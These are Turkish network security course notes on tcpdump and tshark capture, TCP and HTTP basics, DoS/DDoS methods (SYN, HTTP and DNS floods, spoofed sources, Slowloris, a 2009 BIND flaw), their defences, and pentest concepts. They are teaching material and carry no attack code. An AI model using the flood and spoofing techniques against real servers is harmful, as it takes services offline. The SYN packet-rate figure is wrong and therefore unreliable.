Not! -w ile herhangi bir dosyaya kaydederken filtreleme yapılabilir. Mesela sadece şu tip paketleri kaydet ya da timestampleri kaydetme gibi, aynı şekilde -r ile paketlerie okurken filtre belirtebiliriz. Bu filtrenin -w ile belirtilen filtre ile aynı olma zorunluluğu yoktur.

 
Yakalanacak Paket Sayısını Belirleme ( -c )
# tcpdump -i eth0 -c 5 
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
 listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes
 00:59:01.638353 IP maviyan.net.ssh > 10.0.0.2.1040: P 
1010550647:1010550763(116) ack 774164151 win 8576 
00:59:01.638783 IP 10.0.0.2.1040 > maviyan.net.ssh: P 1:53(52) ack 116 win 16520
 00:59:01.638813 IP maviyan.net.ssh > 10.0.0.2.1040: P 116:232(116) ack 53 win 8576
 00:59:01.639662 IP 10.0.0.2.1040 > maviyan.net.ssh: P 53:105(52) ack 232 win 16404 
00:59:01.640377 IP maviyan.net.ssh > 10.0.0.2.1040: P 232:380(148) ack 105 win 8576
 5 packets captured
 5 packets received by filter
 0 packets dropped by kernel

Tcpdump, -c sayı ile belirtilen değer kadar paket yakaladıktan sonra çalışmasını durduracaktır.

 Yakalanacak Paket Boyutunu Belirleme ( -s ) 
-s parametresi ile yakalancak paketlerin boyutunu byte olarak belirtilebilir. 
#tcpdump –s 1500 gibi. Öntanımlı olarak 96 byte kaydetmektedir. 

# tcpdump -i eth0 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode 
listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes 

Detaylı Loglama (-v) -v parametresi ile tcpump'dan biraz daha detaylı loglama yapmasını istenebilir. Mesela bu parametre ile tcpdump çıktılarını TTL ve ID değerleri ile birlikte edinebilir.


 
Tcpdump kullanarak ethernet başlık bilgileri de yakalanabilir. Özellikle yerel ağlarda yapılan trafik analizlerinde MAC adresleri önemli bilgiler vermektedir.

BPF(Berkley Packet Filter) Tcpdump ile gelişmiş paket yakalama için BPF kullanılabilir(sadece X hostunun Y portundan gelen paketleri yakala gibi). 
BPF üç ana kısımdan oluşur
 Type 
Host, net, port parametreleri. 
Direction 
Src, dst parametreleri.
 Protocol
 Ether, fddi, wlan, ip, ip6, arp, rarp parametreleri.
 Host Parametresi Sadece belli bir host a ait paketlerin izlenmesini isteniyorsa host parametresi kullanılabilir.
 # tcpdump host 10.0.0.21 bu komutla kaynak ya da hedef ip adresi 10.0.0.21 olan paketlerin alınmasını istiyoruz

dst host (Hedef Host Belirtimi) 
dst host ;hedef host olarak belirtilen adrese ait paketleri yakalar, 
# tcpdump -i eth0 dst host 10.0.0.1 
yukarıdaki komutla makinemizin eth0 arabirimine gelen ve hedefi 10.0.0.1 olan tüm paketler yakalanacaktır. 
# tcpdump -i eth0 dst host 10.0.0.1 
tcpdump: listening on eth0 10:47:20.526325 10.0.0.21 > 10.0.0.1: icmp: echo request ile de hedef ip si 10.0.0.1 olan ip adreslerini izlemiş oluyoruz.

# tcpdump host hotmail.com 
dst ve src i aynı komuttada kullanabiliriz.
 Örnek:
 kaynak ip si 10.1.0.59 hedef hostu 10.1.0.1 olan paketleri izlemek istersek 
# tcpdump src host 10.1.0.59 and dst host 10.1.0.1


 



TCP/IP
Paket, protokol kavramlarının detaylı olaran anlaşılmasının en kolay yolu “Sniffer” olarak da adlandırılan ağ paket/protokol analiz programlarıyla pratik çalışmalar yapmaktır. Bu yazıda siber dünyada en sık kullanılan paket/protokol analiz programlarından Wireshark’ın komut satırı versiyonu kullanılarak ileri seviye paket, protokol analizi çalışmaları gerçekleştirilmiştir.











Paket Analizi 

Paket, Protokol Kavramları
 Paket ve protokol birbirleri yerine sık kullanılan ama gerçekte birbirinden farklı iki kavramdır. Paket kavramı protokol kavramına göre daha kuşatıcıdır(paket>protokol). Paket’den kastımız TCP/IP ağlarda tüm iletişimin temelidir, protokol ise paketlerin detayıdır.
 Gönderip alınan mailler, web sayfası ziyaretleri , -VOIP kullanılıyorsa- telefon konuşmaları vs arka planda hep paketler vasıtasıyla hedef sisteme ulaştırılır. Bu paketleri izleme ve inceleme “sniffer” adı verilen programlar vasıtasıyla mümkündür.
 Bir de bu paketler içerisinde gidip gelen protokoller vardır. Mesela web sayfalarına giriş için HTTP, 3G ya da GPRS bağlantıları için GTP, mail için SMTP gibi… Bu protokollere taşıyıcılık yapan daha alt seviye protokoller de vardır TCP, IP, UDP gibi. Tüm bu protokoller iletişime geçmek isteyen uçlar arasında azami standartları belirlemek için düşünülmüştür.
 Paket ve protokol analizi için sniffer araçları kullanılır. Bazı snifferlar kısıtlı protokol analizi yapabilirken bazı snifferlar detaylı paket ve protokol analizi yapmaya olanak sağlar. Kısıtlı paket ve protokol analizine imkan sağlayan sniffer olarak tcpdump’ı, gelişmiş paket ve protokol analizine örnek olarak da Wireshark/Tshark örnek verebilir.

Tshark Nedir? 
Tshark, açık kaynak kodlu güçlü bir ağ protokolleri analiz programıdır. Tshark komut satırından çalışır ve yine bir ağ trafik analiz programı olan Wireshark’da bulunan çoğu özelliği destekler.
 Akıllara Wireshark varken neden Tshark kullanılır diye bir soru takılabilir? Bu sorunun çeşitli cevapları olmakla birlikte en önemli iki cevabı Tshark’ın komut satırı esnekliği sağlaması ve Wireshark’a göre daha performanslı çalışmasıdır. 
Basit Tshark Kullanımı 
Tshark, çeşitli işlevleri olan bir sürü parametreye sahiptir. Eğer herhangi bir parametre kullanılmadan çalıştırılırsa ilk aktif ağ arabirimi üzerinden geçen trafiği yakalayıp ekrana basmaya başlar.
 cyblabs ~ # tshark 
Capturing on eth0 
0.000000 192.168.2.23 -> 80.93.212.86 ICMP Echo (ping) request
 0.012641 80.93.212.86 -> 192.168.2.23 ICMP Echo (ping) reply
 0.165214 192.168.2.23 -> 192.168.2.22 SSH Encrypted request packet len=52
 0.165444 192.168.2.22 -> 192.168.2.23 SSH Encrypted response packet len=52
 0.360152 192.168.2.23 -> 192.168.2.22 TCP pcia-rxp-b > ssh [ACK] Seq=53 Ack=53 Win=59896 Len=0
 0.612504 192.168.2.22 -> 192.168.2.23 SSH Encrypted response packet len=116 
1.000702 192.168.2.23 -> 80.93.212.86 ICMP Echo (ping) request 
1.013761 80.93.212.86 -> 192.168.2.23 ICMP Echo (ping) reply 
1.057335 192.168.2.23 -> 192.168.2.22 SSH Encrypted request packet len=52 16 packets captured

Eğer çıktıların ekrana değil de sonradan analiz için bir dosyaya yazdırılması isteniyorsa -w dosya_ismi parametresi kullanılır. cyblabs ~ # tshark -w home_labs.pcap 
Running as user “root” and group “root”. This could be dangerous.
 Capturing on eth0 
24 
Gerektiğinde home_labs.pcap dosyası libpcap destekli herhangi bir analiz programı tarafından okunabilir. Tshark ya da tcpdump ile kaydedilen dosyadan paket okumak için -r parametresi kullanılır.
Tshark çıktılarının anlaşılır text formatta kaydedilmesi isteniyorsa tshark komutu sonuna > dosya_ismi yazılarak ekranda görünen anlaşılır çıktılar doğrudan dosyaya yazdırılmış olur.

Dinleme Yapılabilecek Arabirimleri Listeleme 
root@cyblabs:~# tshark -D 
1. eth0 
2. usbmon1 (USB bus number 1) 
3. usbmon2 (USB bus number 2) 
4. any (Pseudo-device that captures on all interfaces) 
5. lo 
Arabirim Belirtme İstenilen arabirimi dinlemek için -i arabirim_ismi parametresi ya da “-i arabirim_sıra_numarası” parametresi kullanılır. #tshark -i eth12 veya #tshark –i 1 gibi. -n parametresi ile de host isimlerinin ve servis isimlerinin çözülmemesi sağlanır


 
 
 
            • Web sayfası/servislerinin isteklere geç cevap dönmesi 
            • Ağ performansında yavaşlama 
            • İşletim sistemlerinde CPU/Ram performans problemi
             • Uyarı sistemlerinin çökmesi
 
 


Synflood (D)DOS Saldırıları 
1 SYN paketi 60 byte, 50Mb bağlantısı olan biri saniyede teorik olarak 1.000.000 kadar paket gönderebilir. Bu değer günümüzde kullanılan çoğu güvenlik cihazının kapasitesinden yüksektir.
 
Internet’i durdurma(DNS DOS)Saldırıları 
İnternet’in çalışması için gerekli temel protokollerden biri DNS (isim çözme) protokolüdür. DNS ’in çalışmadığı bir internet, levhaları ve yönlendirmeleri olmayan bir yol gibidir. Yolu daha önceden bilmiyorsanız hedefinize ulaşmanız çok zordur. DNS protokolü ve dns sunucu yazılımlarında geçtiğimiz yıllarda çeşitli güvenlik açıklıkları çıktı. Bu açıklıkların bazıları doğrudan dns sunucu yazılımını çalışamaz hale getirme amaçlı DOS açıklıklarıdır. Özellikle internette en fazla kullanılan DNS sunucu yazılımı olan Bind’in bu açıdan geçmişi pek parlak değildir. DNS sunucular eğer dikkatli yapılandırılmadıysa gönderilecek rastgele milyonlarca dns isteğiyle zor durumda bırakılabilir. Bunun için internette çeşitli araçlar mevcuttur. DNS sunucunun loglama özelliği, eş zamanlı alabileceği dns istek sayısı, gereksiz rekursif sorgulamalara açık olması, gereksiz özelliklerinin açık olması (edns vs) vs hep DOS’a karşı sistemleri zor durumda bırakan sebeplerdir. DNS sunucularda çıkan DOS etkili zafiyetlere en etkili örnek olarak 2009 yılı Bind açıklığı gösterilebilir. Hatırlayacak olursak 2009 yılında Bind DNS yazılımında çıkan açıklık tek bir paketle Bind DNS çalıştıran sunucuların çalışmasını durdurabiliyor. DNS paketleri udp tabanlı olduğu için kaynak ip adresi de rahatlıkla gizlenebilir ve saldırganın belirlenmesi imkânsız hale gelir. Türkiye’de yaptığımız araştırmada sunucuların %70’nin bu açıklığa karşı korumasız durumda olduğu ortaya çıkmıştır. Kötü bir senaryo ile ciddi bir saldırgan Türkiye internet trafiğini beş dakika gibi kısa bir sürede büyük oranda işlevsiz kılabilir. Siber güvenlik üzerine çalışan ciddi bir kurumun eksikliği bu tip olaylarda daha net ortaya çıkmaktadır.
Korunma Yolları ve Yöntemleri DOS saldırılarından korunmanın sihirbazvari bir yolu yoktur. Korunmanın en sağlam yöntemi korumaya çalıştığınız network yapısının iyi tasarlanması, iyi bilinmesi ve bu konuyla görevli çalışanların TCP/IP bilgisinin iyi derecede olmasıdır. Çoğu DOS saldırısı yukarıda sayılan bu maddelerin eksikliği sebebiyle başarılı olur.
 Router (Yönlendirici) Seviyesinde Koruma Sınır koruma düzeninde ilk eleman genellikle router’dır. Sisteminize gelengiden tüm paketler öncelikle router’dan geçer ve arkadaki sistemlere iletilir. Dolayısıyla saldırı anında ilk etkilenecek sistemler router’lar olur. Kullanılan router üzerinde yapılacak bazı ayalar bilinen DOS saldırılarını engellemede, ya da en azından saldırının şiddetini düşürmede yardımcı olacaktır. Yine saldırı anında eğer gönderilen paketlere ait karakteristik bir özellik belirlenebilirse router üzerinden yazılacak ACL (Erişim Kontrol Listesi) ile saldırılar kolaylıkla engellenebilir. Mesela saldırganın SYN flood yaptığını ve gönderdiği paketlerde src.port numarasının 1024 olduğunu düşünelim (Türkiye’de yapılan dos saldırılarının çoğunluğu sabit port numarasıyla yapılır). Router üzerinde kaynak port numarası 1024 olan paketleri engellersek saldırıdan en az kayıpla kurtulmuş oluruz. Bu arada kaynak portunu 1024 olarak seçen ama saldırı yapmayan kullanıcılardan gelen trafiklerde ilk aşamada bloklanacak ama normal kullanıcılardaki TCP/IP stacki hemen port numarasını değiştirerek aynı isteği tekrarlayacaktır.
 
 
Web Sunuculara Yönelik Koruma Web sunucular şirketlerin dışa bakan yüzü olduğu için genellikle saldırıyı alan sistemlerdir. Web sunuculara yönelik çeşitli saldırılar yapılabil fakat en etkili saldırı tipleri GET flood saldırılarıdır. Bu saldırı yönteminde saldırgan web sunucunun kapasitesini zorlayarak normal kullanıcıların siteye erişip işlem yapmasını engeller. Bu tip durumlarda güvenlik duvarlarında uygulanan rate limiting özelliği ya da web sunucular önüne koyulacak güçlü yük dengeleyici/dağıtıcı(load balancer)cihazlar ve ters proxy sistemleri oldukça iyi koruma sağlayacaktır. Güvenlik duvarı kullanarak http GET isteklerine limit koyulamaz. Zira http keepalive özelliği sayesinde tek bir TCP bağlantısı içerisinden yüzlerce http GET komutu gönderebilir. Burada paket içeriğine bakabilecek güvenlik duvarı/ips sistemleri kullanılmalıdır. Mesela Snort saldırı tespit/engelleme sistemi kullanılarak aşağıdaki kuralla 3 saniyede 50’den fazla http GET isteği gönderen ip adresleri bloklanabilmektedir.


 
 
Temel TCP bilgisi OSI katmanına göre 4. Katta yer alan TCP günümüz internet dünyasında en sık kullanılan protokoldür. Aynı katta yer alan komşu protokol UDP’e göre oldukça karışık bir yapıya sahiptir. HTTP, SMTP, POP3, HTTPS gibi protokoller altyapı olarak TCP kullanırlar.
 TCP Bağlantılarında Bayrak Kavramı (TCP Flags) TCP bağlantıları bayraklarla (flags) yürütülür. Bayraklar TCP bağlantılarında durum belirleme konumuna sahiptir. Yani bağlantının başlaması, veri transferi, onay mekanizması ve bağlantının sonlandırılması işlemleri tamamen bayraklar aracılığı ile gerçekleşir (SYN, ACK, FIN, PUSH, RST, URG bayrak çeşitleridir). UDP’de ise böyle bir mekanizma yoktur. UDP’de güvenilirliğin (paketlerin onay mekanizması) sağlanması üst katmanlarda çalışan uygulamalar yazılarak halledilebilir. DNS protokolü UDP aracılığı ile nasıl güvenilir iletişim kurulacağı konusunda detay bilgi verecektir. UNIX/Windows sistemlerde bağlantılara ait en detaylı bilgi netstat (Network statistics) komutu ile elde edilir. Netstat kullanarak TCP, UDP hatta UNIX domain socketlere ait tüm bilgileri edinebiliriz. 
TCP’de bağlantıya ait oldukça fazla durum vardır. TCP bağlantılarında netstat aracılığı ile görülebilecek çeşitli durumlar: CLOSE_WAIT, CLOSED, ESTABLISHED, FIN_WAIT_1, FIN_WAIT_2, LAST_ACK, LISTEN, SYN_RECEIVED, SYN_SEND ve TIME_WAIT

 
 

 
 



HTTP’e Giriş 
HTTP(Hypertext Transfer Protocol) OSI modelinde uygulama katmanında yer alan iletişim protokolüdür. Günümüzde zamanımızın çoğunu geçirdiğimiz sanal dünyada en sık kullanılan protokoldür.(%96 civarında) 
HTTP Nasıl Çalışır? Http’nin istemci-sunucu mantığıyla çalışan basit bir yapısı vardır. Önce TCP bağlantısı açılır, kullanıcı istek(HTTP isteği) gönderir sunucu da buna uygun cevap döner ve TCP bağlantısı kapatılır. İstemci(kullanıcı) tarafından gönderilen istekler birbirinden bağımsızdır ve normalde her HTTP isteği için bir TCP bağlantısı gerekir. HTTP’nin basitliğinin yanında günümüz web sayfaları sadece http sunuculardan oluşmaz, çoğu sistemin bilgilerini tutmak için kullanılan veri tabanları da artık web sayfalarının vazgeçilmez bileşeni olmuştur.
 
Yukarıdaki resim klasik bir web sayfasını temsil eder. Buna göre web sayfalarımız ister web sunucuyla aynı makinede olsun ister başka bir makinede olsun bir veritabanında bağımlıdır. Web ’in çalışma mantığı istek ve cevaplardan oluşur, istekler ve bunlara dönülecek cevaplar farklıdır. Bu konuda detay için HTTP RFC’si 2616 incelenebilir.

 
Kaba kuvvet DOS/DDOS Saldırıları Bu tip saldırılarda sunucu üzerinde ne çalıştığına bakılmaksızın eş zamanlı olarak binlerce istek gönderilir ve sunucunun kapasitesi zorlanır. Literatürde adı “GET Flood”, “POST Flood” olarak geçen bu saldırılar iki şekilde yapılabilir. Bir kişi ya da birden fazla kişinin anlaşarak belli bir hedefe eş zamanlı yüzlerce, binlerce istek gönderir ya da bu işi hazır kölelere(zombie) devredilerek etki gücü çok daha yüksek Dos saldırıları gerçekleştirilir. İlk yöntemde bir iki kişi ne yapabilir diye düşünülebilir fakat orta ölçekli çoğu şirketin web sayfası tek bir kişinin oluşturacağı eşzamanlı yüzlerce isteğe karşı uzun süre dayanamayacaktır. Güzel olan şu ki bu tip saldırıların gerçekleştirilmesi ne kadar kolaysa engellemesi de o kadar kolaydır (güvenlik duvarları/IPS’lerin rate limiting özelliği vs) İkinci yöntem yani Zombi orduları (BotNet’ler) aracılığıyla yapılan HTTP Flood saldırıları ise binlerce farklı kaynaktan gelen HTTP istekleriyle gerçekleştirilir. Gelen bağlantıların kaynağı dünyanın farklı yerlerinden farklı ip subnetlerinden gelebileceği için network seviyesinde bir koruma ya da rate limiting bir işe yaramayacaktır

Yazılımsal ya da tasarımsal eksikliklerden kaynaklanan DOS/DDOS Saldırıları Tasarımsal zafiyetler protokol düzenlenirken detaylı düşünülmemiş ya da kolaylık olsun diye esnek bırakılmış bazı özelliklerin kötüye kullanılmasıdır. Tasarımsal zafiyetlerden kaynaklanan DOS saldırılarına en iyi örnek geçtiğimiz aylarda yayınlanan Slowloris aracıdır. Bu araçla tek bir sistem üzerinden Apache HTTP sunucu yazılımını kullanan sistemler rahatlıkla devre dışı bırakılabilir. Benzeri şekilde Captcha kullanılmayan formlarda ciddi DOS saldırılarına yol açabilir. Mesela form üzerinden alınan bilgiler bir mail sunucu aracılığıyla gönderiliyorsa saldırgan olmayan binlerce e-posta adresine bu form üzerinden istek gönderip sunucunun mail sistemini kilitleyebilir. Zaman zaman da web sunucu yazılımını kullanan ve web sayfalarını dinamik olarak çalıştırmaya yarayan bileşenlerde çeşitli zafiyetler çıkmaktadır. Mesela yine geçtiğimiz günlerde yayınlanan bir PHP zafiyeti (PHP “multipart/formdata” denial of service)ni kullanılarak web sunucu rahatlıkla işlevsiz bırakabilir. Bu tip zafiyetler klasik sınır koruma araçlarıyla kapatılamayacak kadar karmaşıktır. Yazılımları güncel tutma, yapılandırma dosyalarını iyi bilme en iyi çözümdür. 
Web sunucularına yönelik performans test araçları DDOS korumasında web sunucularımızı olası bir DOS/DDOS’a maruz kalmadan test edip gerekli ayarlamaları, önlemleri almak yapılacak ilk işlemdir. Bunun için saldırganların hangi araçları nasıl kullanacağını bilmek işe yarayacaktır. Zira günümüzde saldırgan olarak konumlandırdığımız kişilerin eskisi gibi uzman seviyesinde bilgi sahibi olmasına gerek kalmamıştır, aşağıda ekran görüntüsünden görüleceği gibi sadece hedef ip/host girilerek etkili bir dos saldırısı başlatılabilir.

Web sunuculara yönelik DOS/DDOS saldırılarından korunma diğer DOS/DDOS yöntemlerine göre daha zordur(synflood, udp flood, smurf vs). Diğer saldırı yöntemleri genelde L4(TCP/UDP/ICMP) seviyesinde gerçekleştiği için ağ koruma cihazları( Router, Firewall, NIPS)tarafından belirli oranda engellenebilir fakat HTTP üzerinden yapılan DOS saldırılarında istekler normal kullanıcılardan geliyormuş gibi gözüktüğü için ağ güvenlik cihazları etkisiz kalmaktadır. Yine de web sunucular ve önlerine koyulacak ağ güvenlik cihazları iyi yapılandırılabilirse bu tip saldırılardan büyük oranda korunulabilir. • Kullanılan web sunucu yazılımı konfigürasyonunda yapılacak performans iyileştirmeleri • İstekleri daha rahat karşılayacak ve gerektiğinde belleğe alabilecek sistemler kullanılmalı Loadbalancer, reverseProxy kullanımı(Nginx gibi) • Firewall/IPS ile belirli bir kaynaktan gelebilecek max. İstek/paket sayısı sınırlandırılmalı (rate limiting kullanımı) • Saldırı anında loglar incelenerek saldırıya özel bir veri alanı belirlenebilirse (User-Agent, Refererer vs) IPS üzerinden özel imzalar yazılarak bu veri alanına sahip paketler engellenebilir fakat bunun normal kullanıcıları da etkileyeceği bilinmesi gereken nir konudur. • Web sunucunun desteklediği dos koruma modülleri kullanılabilir (Apache Mod_dosevasive) İyi yapılandırılmış bu modülle orta düzey DOS saldırılarının çoğu rahatlıkla kesilebilir. Fakat kullanırken dikkat edilmesi gereken bazı önemli noktalar vardır. Mesela DOS yaptığı şüphelenilen kullanıcılara HTTP 403 cevabı dönmek yerine doğrudan saldırı yapanları iptables(APF) ile bloklatmak sunucuyu gereksiz yere yormayacaktır.

DNS Hakkında Temel Bilgiler 
DNS Nedir? DNS(Domain Name System), temelde TCP/IP kullanılan ağ ortamlarında isimIP/IP-isim eşleşmesini sağlar ve e-posta trafiğinin sağlıklı çalışması için altyapı sunar. Günümüzde DNS’siz bir ağ düşünülemez denilebilir. Her yerel ağda –ve tüm internet ağında- hiyerarşik bir DNS yapısı vardır. Mesela bir e-postanın hangi adrese gideceğine DNS karar verir. Bir web sayfasına erişilmek istendiğinde o sayfanın nerede olduğuna, nerede tutulacağına yine DNS üzerinden karar verilir. Bir sistemin DNS sunucusunu ele geçirmek o sistemi ele geçirmek gibidir. 
DNS Protokol Detayı DNS, UDP temelli basit bir protokoldür. DNS başlık bilgisi incelendiğinde istek ve bu isteğe dönecek çeşitli cevaplar (kodlar kullanılarak bu cevapların çeşitleri belirlenmektedir)
 
 

Genellikle son kullanıcı – DNS sunucu arasındaki sorgulamalar Recursive tipte olur.
 Iterative dns sorgular Iterative sorgu tipinde, istemci dns sunucuya sorgu yollar ve ondan verebileceği en iyi cevabı vermesini bekler, yani gelecek cevap ya ben bu sorgunun cevabını bilmiyorum şu DNS sunucuya sor ya da bu sorgunun cevabı şudur şeklindedir. Genellikle DNS sunucular arasındaki sorgulamalar Iterative tipte olur. 
Genele Açık DNS Sunucular Herkese açık DNS sunucular (public dns) kendisine gelen tüm istekleri cevaplamaya çalışan türde bir dns sunucu tipidir. Bu tip dns sunucular eğer gerçekten amacı genele hizmet vermek değilse genellikle eksik/yanlış yapılandırmanın sonucu ortaya çıkar. Bir sunucunun genele açık hizmet(recursive DNS çözücü) verip vermediğini anlamanın en kolay yolu o DNS sunucusu üzerinden google.com, yahoo.com gibi o DNS sunucuda tutulmayan alan adlarını sorgulamaktır. Eğer hedef DNS sunucu genele açık bir DNS sunucu olarak yapılandırıldıysa aşağıdakine benzer çıktı verecektir.

Public DNS Sunucular Neden Güvenlik Açısından Risklidir? Public dns sunucuların özellikle DNS flood saldırılarına karşı sıkıntılıdırlar. Saldırgan public dns sunucuları kullanarak amplification dns flood saldırılarında size ait dns sunuculardan ciddi oranlarda trafik oluşturarak istediği bir sistemi zor durumda bırakabilir. 
NOT: DNS sunucu olarak ISC BIND kullanılıyorsa aşağıdaki tanımla recursive dns sorgularına –kendisi hariç- yanıt vermesi engellenebilir. options { allow-recursion { 127.0.0.1; };
 DNS Sunucu Yazılımları DNS hizmeti veren çeşitli sunucu yazılımlar bulunmaktadır. ISC Bind, DjbDNS, Maradns, Microsoft DNS yazılımları bunlara örnektir. Bu yazılımlar arasında en yoğun kullanıma sahip olanı ISC Bind’dır. Internetin %80 lik gibi büyük bir kısmı Bind dns yazılımı kullanmaktadır. [1] DNS Sunucu Tipini Belirleme DNS sunucu yazılımlarına gönderilecek çeşitli isteklerin cevapları incelenerek hangi tipte oldukları belirlenebilir. Bunun için temelde iki araç kullanılır: 
1. Nmap gibi bir port tarama/yazılım belirleme aracı 
2. Dig, nslookup gibi klasik sorgulama araçları
 
 
 
 
DNS’e Yönelik DoS ve DDoS Saldırıları
 DNS hizmetine yönelik Dos/DDoS saldırılarını iki kategoride incelenebilir 
• Yazılım temelli DoS saldırıları 
• Tasarım temelli DoS saldırıları 
Yazılım Temelli DoS Saldırıları 
BIND 9 Dynamic Update DoS Zaafiyeti 28.07.2009 tarihinde ISC Bind yazılım geliştiricileri tüm Bind 9 sürümlerini etkileyen acil bir güvenlik zaafiyeti duyurdular. Duyuruya göre eğer DNS sunucunuz Bind9 çalıştırıyorsa ve üzerinde en az bir tane yetkili kayıt varsa bu açıklıktan etkileniyor demektir. Aslında bu zafiyet bind 9 çalıştıran tüm dns sunucularını etkiler anlamına gelmektedir. Bunun nedeni dns sunucunuz sadece caching yapıyorsa bile üzerinde localhost için girilmiş kayıtlar bulunacaktır ve açıklık bu kayıtları değerlendirerek sisteminizi devre dışı bırakabilir.
 Güvenlik Açığı Nasıl Çalışır? Açıklık dns sunucunuzdaki ilgili zone tanımı(mesela:www.lifeoverip.net) için gönderilen özel hazırlanmış dynamic dns update paketlerini düzgün işleyememesinden kaynaklanmaktadır.
 Açıklığın sonucu olarak dns servisi veren named prosesi durmakta ve DNS sorgularına cevap dönememektedir.

DNS Flood DoS/DDoS Saldırıları Bu saldırı tipi genelde iki şekilde gerçekleştirilir:
 ● Hedef DNS sunucuya kapasitesinin üzerinde (bant genişliği olarak değil) DNS istekleri göndererek, normal isteklere cevap veremeyecek hale gelmesini sağlamak 
● Hedef DNS sunucu önündeki Firewall/IPS’in “session” limitlerini zorlayarak Firewall arkasındaki tüm sistemlerin erişilemez olmasını sağlamak Her iki yöntem için de ciddi oranlarda DNS sorgusu gönderilmesi gerekir. Internet üzerinden edinilecek poc(proof of concept) araçlar incelendiğinde çoğunun perl/python gibi script dilleriyle yazıldığı ve paket gönderme kapasitelerinin max 10.000-15.000 civarlarında olduğu görülecektir

 
 
Bilinen DNS Sunucu IP Adreslerinden DNS Flood Gerçekleştirme
 Aynı şekilde subnet kullanımı da gerçekleştirilebilir. Tüm atak bir subnet ya da bir ip aralığı ya da bir ülke ip adresinden geliyormuş gibi gösterilebilir. Bu tip saldırılarda hedef DNS sunucunun önünde gönderilen paket sayısına göre rate limiting/karantina uygulayan IPS, DDoS Engelleme sistemi varsa paket gönderilen sahte ip adresleri bu cihazlar tarafından engellenecektir. Bu da saldırgana internet üzerinde istediği ip adreslerini engelletme lüksü vermektedir.


Bilgi Güvenliğinde Sızma Testleri 
Giriş Günümüz bilgi güvenliğini sağlamak için iki yaklaşım tercih edilmektedi. . Bunlardan ilki savunmacı yaklaşım(defensive) diğeri de proaktif yaklaşım (offensive)olarak bilinir. Bunlardan günümüzde kabul göreni proaktif yaklaşımdır. Pentest –sızma testleri– ve vulnerability assessment –zayıflık tarama- konusu proaktif güvenliğin en önemli bileşenlerinden biridir. Son yıllarda gerek çeşitli standartlara uyumluluktan gerekse güvenliğe verilen önemin artmasından dolayı sızma testleri ve bu konuda çalışanlara önem ve talep artmıştır. Bu yazıda sızma testleri ile ilgili merak edilen sorulara sektörün gözünden cevap verilmeye çalışılacaktır. Yazı, sızma testleri konusunda teknik detaylar içermemektedir. Sızma testleri konusunda teknik bilgiler için http://blog.bga.com.tr adresi takip edilebilir.




 
Sızma Testleri Lüks mü İhtiyaç mı? Sahip olduğunuz bilişim sistemlerindeki güvenlik zaafiyetlerinin üçüncü bir göz tarafından kontrol edilmesi ve raporlanması proaktif güvenliğin ilk adımlarındandır. Siz ne kadar güvenliğe dikkat ederseniz birşeylerin gözünüzden kaçma ihtimali vardır ve internette hackerlarin sayısı ve bilgi becerisi her zaman sizden iyidir. Hackerlara yem olmadan kendi güvenliğinizi bu konudaki uzmanlara (beyaz şapkalı hacker, ethical hacker, sızma test uzmanı vs)test ettirmek firmanın yararına olacaktır. Sağlam bir ekibe yaptırılacak sızma testleri internet üzerinden gelebilecek tehditlerin büyük bir kısmını ortaya çıkarıp kapatılmasını sağlayacaktır. Bununla birlikte bilişim güvenliğinin zamana bağımsız dinamik bir alan olduğu gözönünde bulundurulursa sızma testlerinin tek başına yeterli olmayacağı aşikardır. Sızma testlerinini bitimini takip eden günlerde ortaya çıkabilecek kritik bir güvenlik zafiyeti kurumları zor durumda bırakmak için yeterlidir. Dolayısıyla sızma testleri ile yetinmeyerek mutlaka katmanlı güvenlik mimarisinin kurum güvenlik politikalarında yerini alması önerilmektedir. Güvenlik açısından olduğu kadar çoğu kurum ve kuruluş için sızma testleri ISO 27001, PCI, HIPAA gibi standartlarla zorunlu hale getirilmiştir. Sızma testleri maliyetli bir iştir ve genellikle yöneticiler tarafındans ROI(Return of investment)si hesaplanamayan ya da hatalı hesaplanan bir projedir. Burada iş bilgi güvenliği uzmanlarına düşmektedir. Gerçekleştirilen sızma testlerinin sonuçları yöneticilerin anlayacağı uygun bir biçimde üst yönetime anlatılmalı ve yapılan işin şirkete uzun vadeli kazandırdıkları gösterilmelidir. Kısaca sızma testleri konusunda uzman ekiplere sahip firmalara yaptırılırsa değerli bir iştir, bunun haricinde sadece vicdani rahatlık sağlar ve standartlara uyumluluk kontrol listelerinden bir madde daha tamamlanmış olur.

Sızma Testlerinde Genel Kavramlar 
Pentest, Vulnerability Assessment ve Risk Asssessment Kavramları 
Sızma Testleri (Pentest): Belirlenen bilişim sistemlerine mümkün olabilecek ve müşteri tarafından onayı verilmiş her yolun denenerek sızılmaya çalışma işlemine pentest denir. Pentest de amaç güvenlik açıklığını bulmaktan öte bulunan açıklığı değerlendirip sistemlere yetkili erişimler elde etmek ve elde edilen erişimler kullanılarak tüm zafiyetlerin ortaya çıkarılmasıdır. 
Sızma Test Çeşitleri Gerçekleştirilme yöntemlerine göre sızma testleri üçe ayrılmaktadır. Bunlar aşağıdaki gibi listelenmektedir. 
• Whitebox 
• Blackbox 
• Graybox
 Black box Pentest – Kapalı Kutu Sızma Testleri Bunlardan blackbox bizim genelde bildiğimiz ve yaptırdığımız pentest yöntemidir. Bu yöntemde testleri gerçekleştiren firmayla herhangi bir bilgi paylaşılmaz. Firma ismi ve firmanın sahip olduğu domainler üzerinden firmaya ait sistemler belirlenerek çalışma yapılır. 
White box Pentest – Açık Kutu Sızma Testleri Bu sızma test yönteminde firma tüm bilgileri paylaşır ve olabildiğince sızma testi yapanlara bilgi verme konusunda yardımcı olur. 
Zafiyet Değerlendirme Testleri (Vulnerability Assessment): Belirlenen sistemlerde güvenlik zaafiyetine sebep olabilecek açıklıkların araştırılması. Bu yöntem için genellikle otomatize araçlar kullanılır(Nmap, Nessus, Qualys vs)gibi. Vulnerability assessment çalışmaları sızma testleri kadar tecrübe zaman gerektirmeyen çalışmalardır. Risk assessment tamamen farklı bir kavram olup pentest ve vuln. assessmenti kapsar. Zaman zaman technical risk assessment tanımı kullanılarak Vulnerability assessment kastedilir.

Sızma Testlerinde Proje Yönetimi Gerçekleştirilecek sızma testlerinden en yüksek verimi alabilmek için her işte olduğu gibi burada da plan yapmak gerekir. Pentest planı oluşturmaya başlamak için aşağıdaki temel sorular yeterli olacaktır: 
● Pentest’in kapsamı ne olacak? 
● Sadece iç ağ sistemlerimimi, uygulamalarımı mı yoksa tüm altyapıyı mı test ettirmek istiyorum 
● Testleri kime yaptıracağım 
